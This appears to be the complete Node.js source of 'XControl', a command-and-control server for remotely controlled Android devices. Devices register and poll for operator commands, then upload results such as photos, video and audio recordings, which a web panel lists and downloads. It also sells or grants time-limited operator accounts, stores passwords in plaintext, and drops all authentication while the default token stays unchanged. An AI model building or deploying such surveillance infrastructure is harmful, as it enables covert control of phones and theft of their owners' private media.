here#!/usr/bin/env node
const http = require('http'), fs = require('fs'), path = require('path'), crypto = require('crypto'), os = require('os');

const PORT  = process.env.PORT || 8080;
const TOKEN = process.env.TOKEN || 'change-me';
const MAX_DATA = 60 * 1024 * 1024;
const RESULT_TTL = 3600000;
const DEVICE_TTL = 300000;
const DISK_THRESHOLD = 3000000;
const SESSION_TTL = 24 * 3600000;

const devices = new Map(), queues = new Map(), results = new Map(), waiters = new Map();
const sessions = new Map(); // sid -> {username, isAdmin, exp}
const users = new Map();    // username -> {username, password, createdAt, expiresAt}

// حفظ الحسابات في ملف مؤقت (يبقى أثناء عمل المثيل — إذا أعاد Render التشغيل من جديد أنشئ الحسابات مجددًا)
const USERS_FILE = path.join(os.tmpdir(), 'xcontrol_users.json');

function loadUsers() {
  try {
    if (fs.existsSync(USERS_FILE)) {
      const arr = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
      for (const u of arr) users.set(u.username, u);
    }
  } catch (e) {}
}
function saveUsers() {
  try { fs.writeFileSync(USERS_FILE, JSON.stringify([...users.values()])); } catch (e) {}
}
loadUsers();

function diskDir() {
  const d = path.join(os.tmpdir(), 'xcontrol');
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
  return d;
}
function resultFile(cmdId) { return path.join(diskDir(), cmdId + '.b64'); }

setInterval(() => {
  const now = Date.now();
  for (const [id, d] of devices) if (now - d.lastSeen > DEVICE_TTL) { devices.delete(id); queues.delete(id); }
  for (const [k, r] of results) {
    if (now - r.t > RESULT_TTL) {
      results.delete(k);
      if (r.onDisk) try { fs.unlinkSync(resultFile(k)); } catch (e) {}
    }
  }
  // حذف الحسابات المنتهية وجلساتها
  for (const [u, acc] of users) if (acc.expiresAt && acc.expiresAt < now) { users.delete(u); saveUsers(); }
  for (const [sid, s] of sessions) if (s.exp < now) sessions.delete(sid);
}, 60000);

function send(res, code, obj) {
  const body = typeof obj === 'string' ? obj : JSON.stringify(obj);
  res.writeHead(code, {'Content-Type': 'application/json; charset=utf-8', 'Access-Control-Allow-Origin': '*'});
  res.end(body);
}

function getSid(req) {
  const c = req.headers.cookie || '';
  const m = c.match(/sid=([^;]+)/);
  return m ? m[1] : null;
}

function getSession(req) { return sessions.get(getSid(req) || ''); }

function authed(req) {
  if (TOKEN === 'change-me') return true;
  const s = getSession(req);
  if (s && s.exp > Date.now()) return true;
  const t = req.headers['x-token'] || new URL(req.url, 'http://x').searchParams.get('t');
  return t === TOKEN;
}

function isAdminReq(req) {
  const s = getSession(req);
  return s && s.isAdmin;
}

function mimeFor(fname) {
  const ext = (fname || '').split('.').pop().toLowerCase();
  const m = {
    jpg: 'image/jpeg', jpeg: 'image/jpeg', png: 'image/png', gif: 'image/gif',
    webp: 'image/webp', bmp: 'image/bmp',
    mp4: 'video/mp4', '3gp': 'video/3gpp', webm: 'video/webm', mkv: 'video/x-matroska',
    m4a: 'audio/mp4', mp3: 'audio/mpeg', aac: 'audio/aac', wav: 'audio/wav',
    ogg: 'audio/ogg', amr: 'audio/amr'
  };
  return m[ext] || 'application/octet-stream';
}

function clearResults() {
  for (const k of [...results.keys()]) {
    const r = results.get(k);
    if (r && r.onDisk) try { fs.unlinkSync(resultFile(k)); } catch (e) {}
    results.delete(k);
  }
}

const server = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  const p = u.pathname;

  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-token'
    });
    return res.end();
  }

  let buf = [], total = 0, tooBig = false;
  req.on('data', c => { total += c.length; if (total <= MAX_DATA) buf.push(c); else tooBig = true; });
  req.on('end', () => {
    if (tooBig) return send(res, 413, {error: 'request too large (max ' + Math.floor(MAX_DATA / 1048576) + 'MB)'});

    let j = null;
    try { const s = Buffer.concat(buf).toString('utf8'); j = s ? JSON.parse(s) : null; } catch (e) {}
    const now = Date.now();

    // ====== تسجيل الدخول: admin بالرمز + حسابات مؤقتة ======
    if (p === '/api/login' && req.method === 'POST') {
      const username = String((j && j.username) || '').trim();
      const password = String((j && j.password) || '');
      let isAdmin = false;

      if (username === 'admin') {
        if (TOKEN !== 'change-me' && password !== TOKEN) return send(res, 401, {error: 'بيانات الدخول غير صحيحة'});
        isAdmin = true;
      } else {
        const acc = users.get(username);
        if (!acc || acc.password !== password) return send(res, 401, {error: 'بيانات الدخول غير صحيحة'});
        if (acc.expiresAt && acc.expiresAt < now) return send(res, 401, {error: 'انتهت صلاحية هذا الحساب'});
      }

      const sid = crypto.randomBytes(16).toString('hex');
      const acc = users.get(username);
      const exp = isAdmin ? now + SESSION_TTL
                          : Math.min(now + SESSION_TTL, (acc && acc.expiresAt) || now + SESSION_TTL);
      sessions.set(sid, { username, isAdmin, exp });
      res.writeHead(200, {
        'Content-Type': 'application/json; charset=utf-8',
        'Access-Control-Allow-Origin': '*',
        'Set-Cookie': 'sid=' + sid + '; Path=/; HttpOnly; Max-Age=86400'
      });
      return res.end(JSON.stringify({ ok: true, username, isAdmin, exp }));
    }
    if (p === '/api/logout' && req.method === 'POST') {
      const sid = getSid(req);
      if (sid) sessions.delete(sid);
      res.writeHead(200, {'Content-Type': 'application/json; charset=utf-8', 'Set-Cookie': 'sid=; Path=/; Max-Age=0'});
      return res.end(JSON.stringify({ ok: true }));
    }

    // ====== الصفحات ======
    if (p === '/' || p === '/index.html') {
      const page = authed(req) ? 'index.html' : 'login.html';
      return fs.readFile(path.join(__dirname, 'public', page), (e, data) => {
        if (e) return send(res, 500, {error: 'panel missing'});
        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
        res.end(data);
      });
    }
    if (!authed(req)) return send(res, 403, {error: 'bad token'});

    // ====== بيانات الجلسة الحالية ======
    if (p === '/api/me' && req.method === 'GET') {
      const s = getSession(req);
      if (!s) return send(res, 403, {error: 'no session'});
      return send(res, 200, { username: s.username, isAdmin: s.isAdmin, exp: s.exp });
    }

    // ====== إدارة المستخدمين (للمدير فقط) ======
    if (p === '/api/users' && req.method === 'GET') {
      if (!isAdminReq(req)) return send(res, 403, { error: 'admin only' });
      const list = [...users.values()].map(acc => ({
        username: acc.username,
        createdAt: acc.createdAt,
        expiresAt: acc.expiresAt,
        active: Date.now() < acc.expiresAt
      }));
      return send(res, 200, list);
    }
    if (p === '/api/users' && req.method === 'POST') {
      if (!isAdminReq(req)) return send(res, 403, { error: 'admin only' });
      const username = String((j && j.username) || '').trim();
      const password = String((j && j.password) || '');
      const hours = Math.max(1, Math.min(24 * 365, parseInt(j && j.hours) || 24));
      if (!username || !password) return send(res, 400, { error: 'username & password required' });
      if (username === 'admin') return send(res, 400, { error: 'admin is reserved' });
      if (users.has(username)) return send(res, 400, { error: 'username exists' });
      const acc = { username, password, createdAt: Date.now(), expiresAt: Date.now() + hours * 3600000 };
      users.set(username, acc);
      saveUsers();
      return send(res, 200, { ok: true, username, expiresAt: acc.expiresAt });
    }
    if (p === '/api/users' && req.method === 'DELETE') {
      if (!isAdminReq(req)) return send(res, 403, { error: 'admin only' });
      const username = String((j && j.username) || '').trim();
      if (!users.delete(username)) return send(res, 404, { error: 'not found' });
      saveUsers();
      // إبطال جلسات المستخدم المحذوف فورًا
      for (const [sid, s] of [...sessions]) if (s.username === username) sessions.delete(sid);
      return send(res, 200, { ok: true });
    }
    if (p === '/api/clear' && req.method === 'POST') {
      clearResults();
      return send(res, 200, { ok: true });
    }

    if (p === '/register' && req.method === 'POST') {
      const id = String((j && j.id) || crypto.randomUUID());
      const old = devices.get(id);
      devices.set(id, { id,
        name: String((j && j.name) || 'device'), model: String((j && j.model) || ''),
        android: String((j && j.android) || ''), ip: req.socket.remoteAddress,
        lastSeen: now, firstSeen: old ? old.firstSeen : now });
      if (!queues.has(id)) queues.set(id, []);
      return send(res, 200, { ok: true, id });
    }
    if (p === '/poll' && req.method === 'POST') {
      const id = j && j.id; const d = devices.get(id);
      if (!d) return send(res, 200, {});
      d.lastSeen = now;
      const q = queues.get(id) || [];
      if (q.length) { const c = q.shift(); return send(res, 200, { cmd: c.cmd, args: c.args, cmdId: c.cmdId }); }
      const oldW = waiters.get(id);
      if (oldW) { clearTimeout(oldW.t); send(oldW.res, 200, {}); }
      const t = setTimeout(() => { waiters.delete(id); send(res, 200, {}); }, 25000);
      waiters.set(id, { res, t });
      return;
    }
    if (p === '/result' && req.method === 'POST') {
      const { id, cmdId, ok, data, fname } = j || {};
      if (!cmdId) return send(res, 400, { error: 'missing cmdId' });
      const r = { id, cmdId, ok: !!ok, data: data || null, fname: fname || null, t: now };
      if (r.data && r.data.length > DISK_THRESHOLD) {
        try {
          fs.writeFileSync(resultFile(cmdId), r.data);
          r.size = Math.round(r.data.length * 0.75);
          r.data = null; r.onDisk = true;
        } catch (e) { r.onDisk = false; }
      }
      results.set(cmdId, r);
      const d = devices.get(id); if (d) d.lastSeen = now;
      const w = waiters.get(id);
      if (w) { clearTimeout(w.t); waiters.delete(id); send(w.res, 200, {}); }
      return send(res, 200, { ok: true });
    }
    if (p === '/api/devices')
      return send(res, 200, [...devices.values()].sort((a, b) => b.lastSeen - a.lastSeen));

    if (p === '/api/exec' && req.method === 'POST') {
      const { id, cmd, args } = j || {};
      if (!id || !devices.has(id)) return send(res, 404, { error: 'device offline' });
      const cmdId = crypto.randomUUID();
      queues.get(id).push({ cmdId, cmd, args: args || {}, t: now });
      const w = waiters.get(id);
      if (w) { clearTimeout(w.t); waiters.delete(id); send(w.res, 200, {}); }
      return send(res, 200, { ok: true, cmdId });
    }
    if (p === '/api/results' && req.method === 'POST') {
      const { id } = j || {};
      const list = [...results.values()].filter(r => r.id === id).sort((a, b) => a.t - b.t).slice(-60)
        .map(r => {
          const big = !!r.fname || (r.data && r.data.length > 700000) || !!r.onDisk;
          return { cmdId: r.cmdId, ok: r.ok, fname: r.fname, file: big,
                   size: r.size || (r.data ? Math.round(r.data.length * 0.75) : 0),
                   data: big ? null : r.data, t: r.t };
        });
      return send(res, 200, list);
    }
    if (p.startsWith('/api/file/')) {
      const cmdId = decodeURIComponent(p.slice('/api/file/'.length));
      const r = results.get(cmdId);
      if (!r || (r.data == null && !r.onDisk)) return send(res, 404, { error: 'expired' });
      let b;
      try { b = r.onDisk ? fs.readFileSync(resultFile(cmdId)) : Buffer.from(r.data, 'base64'); }
      catch (e) { return send(res, 500, { error: 'decode' }); }
      const fname = (r.fname || 'file').replace(/["\r\n]/g, '');
      const force = u.searchParams.get('dl') === '1';
      const disposition = (force || !/^(image|audio|video)\//.test(mimeFor(fname))) ? 'attachment' : 'inline';
      res.writeHead(200, {
        'Content-Type': mimeFor(fname), 'Content-Length': b.length,
        'Access-Control-Allow-Origin': '*',
        'Content-Disposition': disposition + '; filename="' + fname + '"'
      });
      return res.end(b);
    }
    send(res, 404, { error: 'not found' });
  });
});

server.listen(PORT, () => console.log(`XControl on :${PORT}`));
